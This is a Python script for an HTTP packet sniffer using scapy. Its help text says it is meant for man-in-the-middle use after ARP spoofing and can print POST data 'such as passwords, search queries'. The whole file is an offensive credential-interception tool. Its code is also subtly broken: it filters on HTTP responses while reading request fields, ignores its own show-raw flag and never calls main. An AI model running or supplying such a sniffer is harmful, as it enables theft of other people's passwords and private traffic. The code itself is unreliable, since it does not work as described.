from scapy import all
from scapy.all import *
from scapy.layers.http import * # import HTTP packet
from scapy.layers.inet import IP
from colorama import init, Fore
import argparse

init() # to utilize the colorama library
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

def sniff_packets(iface=None):
    """
    https://scapy.readthedocs.io/en/latest/api/scapy.route6.html#scapy.route6.Route6.remove_ipv6_iface
    iface to sniff packets and it is none by default
    """
    if iface: # if default on port 80
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False) # callback process
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)

def process_packet(packet):
    # https://www.geeksforgeeks.org/packet-sniffing-using-scapy/
    # https://programs.team/detailed-explanation-of-scapy-packet-construction.html
    if packet.haslayer(HTTPResponse): # packet is HTTP Request
        url = packet[HTTPResponse].Host.decode() + packet[HTTPResponse].Path.decode() # getting the URL 
        ip = packet[IP].src # and the IP address of the origin
        method = packet[HTTPResponse].Method.decode() # and what kind of method it is
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}") # print to the console
        if packet.haslayer(Raw) and method == "POST": # POST method
            print(f"\n{RED}[*] Raw data: {packet[Raw].load}{RESET}") # it has raw data 

def main():
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    args.show_raw

    sniff_packets(iface)